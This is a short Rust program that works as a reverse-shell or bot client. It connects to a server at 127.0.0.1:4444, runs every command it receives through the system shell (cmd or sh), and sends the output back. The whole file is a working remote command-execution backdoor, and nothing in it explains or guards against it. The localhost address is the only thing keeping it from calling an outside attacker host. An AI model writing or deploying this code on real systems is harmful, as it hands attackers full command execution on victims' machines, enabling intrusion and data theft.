use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // Connect to the server
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server at 127.0.0.1:4444");

    let mut buffer = [0u8; 4096];

    loop {
        // Wait for incoming command from server
        let bytes_read = match stream.read(&mut buffer) {
            Ok(0) => {
                println!("Server closed the connection");
                break;
            }
            Ok(n) => n,
            Err(e) => {
                eprintln!("Error reading from server: {}", e);
                break;
            }
        };

        // Convert received bytes into a command string
        let command_str = String::from_utf8_lossy(&buffer[..bytes_read])
            .trim()
            .to_string();

        if command_str.is_empty() {
            continue;
        }

        println!("Received command: {}", command_str);

        // Handle "exit" or "quit" to terminate the bot
        if command_str == "exit" || command_str == "quit" {
            println!("Exit command received. Disconnecting.");
            break;
        }

        // Execute the command on the system
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", &command_str]).output()
        } else {
            Command::new("sh").args(["-c", &command_str]).output()
        };

        // Build a response based on the command output
        let response = match output {
            Ok(out) => {
                let mut result = String::new();
                result.push_str(&String::from_utf8_lossy(&out.stdout));
                result.push_str(&String::from_utf8_lossy(&out.stderr));
                if result.is_empty() {
                    result = format!("(command exited with status {})\n", out.status);
                }
                result
            }
            Err(e) => format!("Failed to execute command: {}\n", e),
        };

        // Print result locally
        print!("{}", response);

        // Send result back to the server
        if let Err(e) = stream.write_all(response.as_bytes()) {
            eprintln!("Error writing to server: {}", e);
            break;
        }
        if let Err(e) = stream.flush() {
            eprintln!("Error flushing stream: {}", e);
            break;
        }
    }

    Ok(())
}

